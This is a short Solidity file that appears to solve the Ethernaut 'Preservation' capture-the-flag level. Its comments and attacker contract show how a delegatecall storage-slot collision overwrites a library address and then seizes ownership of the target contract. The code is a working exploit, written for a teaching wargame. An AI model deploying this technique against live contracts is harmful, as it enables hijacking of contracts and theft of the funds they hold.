  // SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

//delegatecall saves by (slot) in code NOT by name reference allowing update of timeZone1Library address
//point to attack contract with Lirary function to update owner in the contract
//requires that attack and attacked contracts have same storage layout

interface Preservation{
    function setFirstTime(uint _timeStamp) external; 
}

  contract AttackPreservation {
  
    // public library contracts 
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    //uint public myaddress = uint(uint160(address(this)));

    Preservation public preservation;

    constructor(address _address) public {
        preservation = Preservation(_address);
    }

    function change_address() public {
        preservation.setFirstTime(uint(uint160(address(this))));
    }

    function setTime(uint _time) public {
        owner = msg.sender;
    }

  }

  //call contract.setFirstTime(42) from console in ethernaut
